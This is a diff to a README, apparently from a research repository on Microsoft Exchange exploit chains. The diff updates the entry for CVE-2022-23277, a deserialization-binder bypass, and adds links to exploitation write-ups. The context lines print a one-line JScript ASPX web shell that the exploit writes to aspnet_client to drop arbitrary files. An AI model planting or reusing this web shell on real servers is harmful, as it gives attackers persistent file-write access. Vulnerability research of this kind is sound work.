@@ -38,7 +38,7 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | ProxyNotRelay |  |  |  | yes |
 | OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
 | TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
-| CVE-2022-23277 | [CVE-2022-23277]() |  |  | yes |
+| CVE-2022-23277 (WIP) | [CVE-2022-23277](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23277) | Mar 8, 2022 | 由于SerializationBinder的错误使用导致反序列化白名单的绕过，从而实现认证后RCE。触发漏洞的功能与CVE-2021-42321一致 | yes |
 | ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
 | ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
 | CVE-2023-21707 (test failed) | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | 2023年3月9日 | Microsoft Exchange Server 远程执行代码漏洞 | yes |
@@ -77,6 +77,8 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
  - [Exchange Exploit Case Study – CVE-2020-0688](https://community.netwitness.com/t5/netwitness-community-blog/exchange-exploit-case-study-cve-2020-0688/ba-p/517916)
  - [CVE-2020-0688的武器化与.net反序列化漏洞那些事](https://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html)
  - [【实战篇】记一次CVE-2020-0688的漏洞利用](https://www.modb.pro/db/143283)
+ - [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
+ - [Deep Dive into .NET ViewState deserialization and its exploitation](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
 
 该模块利用了Exchange控制面板(ECP)中的.net序列化漏洞。该漏洞是由于Microsoft Exchange Server没有在每次安装的基础上随机化密钥，导致它们使用相同的validationKey和decryptionKey值。有了这些值，攻击者可以制作一个特殊的ViewState，使用.net反序列化NT_AUTHORITY\SYSTEM来执行操作系统命令。
 
@@ -1063,11 +1065,22 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 
 
 
-# CVE-2022-23277
+# CVE-2022-23277 (WIP)
 ## CVE-2022-23277 part links
 
  - [DotNet安全-CVE-2022-23277漏洞复现](https://mp.weixin.qq.com/s/lrlZiVH3QZI3rMRZwk_l6A)
- - [《DotNet安全-CVE-2022-23277漏洞复现》涉及到的工具](https://github.com/7BitsTeam/CVE-2022-23277)
+ - [《DotNet安全-CVE-2022-23277漏洞复现》涉及到的脚本](https://github.com/7BitsTeam/CVE-2022-23277)
+ - [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
+ - [dotnet反序列化之并不安全的SerializationBinder](https://y4er.com/posts/dotnet-deserialize-bypass-binder/)
+ - [2022 Exchange 再相遇之反序列化漏洞分析（二）](https://zhuanlan.zhihu.com/p/531190946)
+ - [Deep understand ASPX file handling and some related attack vectors](https://blog.viettelcybersecurity.com/deep-understand-aspx-file-handling-and-some-related-attack-vector/)
+ - [The journey of exploiting a Sharepoint vulnerability.](https://blog.viettelcybersecurity.com/the-journey-of-exploiting-a-sharepoint-vulnerability/)
+ - [Microsoft Exchange Server ChainedSerializationBinder Remote Code Execution](https://packetstormsecurity.com/files/168131/Microsoft-Exchange-Server-ChainedSerializationBinder-Remote-Code-Execution.html)
+ - [Microsoft Exchange Server: Remote Code Execution vulnerability CVE-2022-23277 exploitable despite patch?](https://borncity.com/win/2022/06/30/microsoft-exchange-server-remote-code-execution-schwachstelle-cve-2022-23277-trotz-patch-ausnutzbar/)
+ - [Class: BinaryFormatter](https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryformatter.cs)
+ - [cve-2022-23277 PoC video](https://www.youtube.com/watch?v=b00oDvuDYU0)
+ - [Note nhanh về BinaryFormatter binder và CVE-2022–23277](https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c)
+
 
 认证部分需要通过burpsuite手动添加，利用成功后会在aspnet_client写入1.aspx。
 
@@ -1077,11 +1090,16 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 <%@ Page Language="JScript" Debug="true"%><%@Import Namespace="System.IO"%><%File.WriteAllBytes(Request["b"], Convert.FromBase64String(Request["a"]));%>
 ```
 
- - [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
- - [dotnet反序列化之并不安全的SerializationBinder](https://y4er.com/posts/dotnet-deserialize-bypass-binder/)
- - [2022 Exchange 再相遇之反序列化漏洞分析（二）](https://zhuanlan.zhihu.com/p/531190946)
- - [Deep understand ASPX file handling and some related attack vectors](https://blog.viettelcybersecurity.com/deep-understand-aspx-file-handling-and-some-related-attack-vector/)
- - [The journey of exploiting a Sharepoint vulnerability.](https://blog.viettelcybersecurity.com/the-journey-of-exploiting-a-sharepoint-vulnerability/)
+
+
+
+
+
+
+
+
+
+
 
 # CVE-2023-21707 (反序列化远程代码执行) (test failed)
 ## CVE-2023-21707 part links
